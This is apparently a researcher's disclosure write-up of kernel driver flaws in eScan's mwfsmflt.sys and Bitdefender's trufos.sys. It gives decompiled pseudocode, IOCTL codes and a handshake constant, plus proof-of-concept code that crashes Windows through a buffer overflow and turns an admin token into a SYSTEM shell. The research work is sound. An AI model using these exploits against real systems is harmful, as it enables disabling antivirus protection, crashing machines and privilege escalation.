eScan and Bitdefender Are Now Victims

missing authorization
buffer overflow
privilege escalation
Kernel Windows Antivirus CVE / Zero-Day Minifilter
tl;dr

Two antivirus kernel drivers, zero authentication on their control interfaces. eScan's minifilter lets any unprivileged user disable the entire AV stack or blue-screen (black, I hate that they did this) the machine with a single IOCTL. Bitdefender's scanning minifilter lets any admin escalate to SYSTEM in under a second. Two eScan vulns, one Bitdefender vuln, three working PoCs, all found through static analysis of decompiled pseudocode.


Yeah, yeah, I hear you, "who gives a shit if an Administrator escalates to SYSTEM? Ever heard of SysInternals dumbass?" Yeah, it does sound like shit, but Microsoft says Administrator and SYSTEM are in different security boundaries, so if it's an issue to them, it is to me.

What I Looked At

Looked at two antivirus kernel drivers from different vendors. Both load into the kernel for real-time file monitoring and threat scanning.

  • mwfsmflt.sys, an eScan Anti-Virus minifilter. Handles file protection, registry monitoring, USB access control, and log management. Exposes a device object at \\.\mwfsmfltr for usermode communication.
  • trufos.sys, a Bitdefender minifilter that handles core background tasks. Communicates through a filter port at \TRFCOMMPORT.

The bugs are not subtle.

CVE-2026-XXXX: Killing the AV

mwfsmflt.sys is an eScan Anti-Virus minifilter. It creates a device object for usermode communication and never applies a security descriptor to it.

DriverEntry, sub_14E18
v8 = IoCreateDevice(DriverObject, 0x10u, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
if ( v8 >= 0 )
{
    v8 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
    // ...
    DriverObject->MajorFunction[0]  = (PDRIVER_DISPATCH)sub_1380C;   // IRP_MJ_CREATE
    DriverObject->MajorFunction[2]  = (PDRIVER_DISPATCH)sub_13858;   // IRP_MJ_CLOSE
    DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)sub_138A4;   // IRP_MJ_DEVICE_CONTROL
}

Device type 0x22, which is FILE_DEVICE_UNKNOWN. Characteristics 0x100. And a zero for the security descriptor parameter. No follow-up call to IoCreateDeviceSecure. No manual DACL. The device inherits a permissive default that lets any authenticated user open it.

The IRP_MJ_CREATE handler confirms it:

sub_1380C
__int64 __fastcall sub_1380C(__int64 a1, IRP *a2)
{
  int v2 = dword_4D658;
  a2->IoStatus.Information = 0;
  if ( v2 && v2 != 5 && v2 != 7 )
    DbgPrint("IRP_MJ_CREATE\n");
  a2->IoStatus.Status = 0;
  IofCompleteRequest(a2, 0);
  return 0;
}

A debug log gated by a global flag. Then STATUS_SUCCESS and IofCompleteRequest. No token check. No PID check. Nothing. Any user gets a handle.

With a handle, you own the IOCTL dispatch. The driver exposes nine protection flags, each controlled by a dedicated IOCTL code. Send the disable code and the driver writes zero to the corresponding global DWORD. The minifilter callback checks that DWORD, reads zero, returns FLT_PREOP_SUCCESS_NO_CALLBACK, and that protection category goes dark.

IOCTL 0x222444 handler
// disable local file protection
dword_4D664 = 0;
if ( dword_4D658 && dword_4D658 != 5 && dword_4D658 != 7 )
  DbgPrint("Local File Protection Off\n");

No input buffer read. No InputBufferLength check. The on/off state is determined entirely by which IOCTL code you send. Separate codes for enable and disable. Zero authorization on any of them.

There is also a PID whitelist. IOCTL 0x222450 feeds into sub_129C0, which acquires spinlock qword_4D620 and appends your PID to a global array. Whitelisted PIDs bypass all behavioral filtering in the minifilter callbacks.

The dispatch has zero security-related API calls. No SeSinglePrivilegeCheck, no SeAccessCheck, no PsGetCurrentProcessId comparison. Every handler in the table follows the same pattern: set a global, return success.

CVE-2026-XXXX: The Black Screen(?)

Same driver. Same missing DACL. Different IOCTL.

IOCTL 0x222464 is the log path handler. Unlike the flag toggles that just write a constant to a global, this one takes a wide-character string from the input buffer and copies it into word_4FF30, a fixed-size global in the .data section.

IOCTL 0x222464, verbatim decompiler output
v21 = a2->AssociatedIrp.MasterIrp;
if ( dword_4D658 && dword_4D658 != 5 && dword_4D658 != 7 )
  DbgPrint("Setting Log File name.\n");
if ( v21 )
{
  v22 = (char *)((char *)&word_4FF30 - (char *)v21);
  do
  {
    Type = v21->Type;
    *(_WORD *)&v22[(_QWORD)v21] = v21->Type;
    v21 = (struct _IRP *)((char *)v21 + 2);
  }
  while ( Type );
}

The loop has no bounds check. The only guard is if ( v21 ), a null-pointer check. InputBufferLength is never consulted anywhere in the handler.

word_4FF30 sits in the .data section with a fixed allocation. The globals immediately after it include the protection flags, the PID whitelist array, and other driver state. An 8192-WCHAR payload steamrolls through all of it and the kernel bugchecks before the IOCTL even returns.

Compare this to a normal handler in the same dispatch:

IOCTL 0x222444, safe handler
dword_4D664 = 0;
if ( dword_4D658 && dword_4D658 != 5 && dword_4D658 != 7 )
  DbgPrint("Local File Protection Off\n");

No copy loop. No variable-length input. Just a constant assignment. IOCTL 0x222464 is the only handler in the driver that processes variable-length data, and it is the only one without bounds checking.

proof of concept
HANDLE hDev = CreateFileW(L"\\\\.\\mwfsmfltr",
    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

DWORD payload_wchars = 8192;
WCHAR *payload = VirtualAlloc(NULL, payload_wchars * sizeof(WCHAR),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

for (DWORD i = 0; i < payload_wchars - 1; i++)
    payload[i] = L'A';
payload[payload_wchars - 1] = L'\0';

DWORD ret;
DeviceIoControl(hDev, 0x222464,
    payload, payload_wchars * sizeof(WCHAR), NULL, 0, &ret, NULL);
// machine is now dead

CVE-2026-XXXX: Admin to SYSTEM

This one is Bitdefender's code.

trufos.sys communicates through a filter communication port at \TRFCOMMPORT, built with FltBuildDefaultSecurityDescriptor using FLT_PORT_ALL_ACCESS, 0x1F0001. That restricts connections to administrators and SYSTEM. You need admin to even connect.

The port protocol has a handshake, a version negotiation step, and then a command dispatch with 28 handlers. Most of them deal with scanning. Command 23 does something else entirely.

Command 23 tells the driver to create a SYSTEM thread and hand you that thread's token.

The handshake is simple. First message must contain the DWORD 0x12355321. The driver validates it, sets an internal flag at PortCookie + 12, and from that point dispatches all messages through the real command handler.

MessageNotifyCallback, handshake
if ( InputBufferLength >= 4 && OutputBufferLength >= 4
      && OutputBuffer && *InputBuffer == 305484577 )
{
  *OutputBuffer = *(_DWORD *)(v12 + 256);
  if ( ReturnOutputBufferLength )
    *ReturnOutputBufferLength = 4;
  *((_BYTE *)PortCookie + 12) = 1;
}

305484577 is 0x12355321 in decimal. Security through obscurity since the constant is right there in the binary.

After the handshake, messages flow through sub_14005FE70 into the real command dispatcher, sub_14003BCF0. When command 23 comes in, it gets forwarded to sub_1400159C4, which validates input sizes and calls sub_140015500. That function manages the system thread lifecycle. When the flag byte is 1, it spawns a new kernel thread via PsCreateSystemThread. The thread runs HandleInformation as its StartRoutine.

Inside HandleInformation, the chain goes like this:

HandleInformation, token duplication
// open the system process
ClientId.UniqueProcess = PsGetCurrentProcessId();
ZwOpenProcess(&ProcessHandle, 0x1FFFFFu, &ObjectAttributes, &ClientId);

// open the caller's process
ClientId.UniqueProcess = StartContext[4].Header.WaitListHead.Blink;  // target PID
ZwOpenProcess(&TargetProcessHandle, 0x1FFFFFu, &ObjectAttributes, &ClientId);

// open system process token
v7(ProcessHandle, 6, 512, &ExistingTokenHandle);  // ZwOpenProcessTokenEx

// create impersonation copy
ZwDuplicateToken(ExistingTokenHandle, 4u, &ObjectAttributes, 1u, TokenImpersonation, &SourceHandle);

// inject into caller's process
ZwDuplicateObject(
    ProcessHandle,         
    SourceHandle,           
    TargetProcessHandle,    
    &TargetHandle,       
    0,                      
    0,                      
    6u                      
);

The driver opens both the system process and your process with PROCESS_ALL_ACCESS, 0x1FFFFF. Opens the system token, duplicates it as an impersonation token via ZwDuplicateToken with TOKEN_IMPERSONATE access, and then uses ZwDuplicateObject with DUPLICATE_SAME_ACCESS to inject that handle into your process. The handle value comes back through the reply buffer.

The handle carries TOKEN_IMPERSONATE only. Not enough for DuplicateTokenEx directly. But you can bootstrap your way to a full primary token:

  • SetThreadToken to start impersonating SYSTEM
  • OpenThreadToken with OpenAsSelf=FALSE to reopen the token with full access while impersonating
  • DuplicateTokenEx to create a primary token
  • CreateProcessWithTokenW to spawn a SYSTEM shell
proof of concept, token bootstrap
HANDLE hImpToken = (HANDLE)(ULONG_PTR)reply.handle;

SetThreadToken(NULL, hImpToken);

HANDLE hFullToken;
OpenThreadToken(GetCurrentThread(),
    TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
    FALSE, &hFullToken);

HANDLE hPrimary;
DuplicateTokenEx(hFullToken, MAXIMUM_ALLOWED,
    NULL, SecurityImpersonation, TokenPrimary, &hPrimary);

RevertToSelf();

wchar_t cmdline[] = L"cmd.exe";
CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE,
    NULL, cmdline, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
// you now have a SYSTEM shell
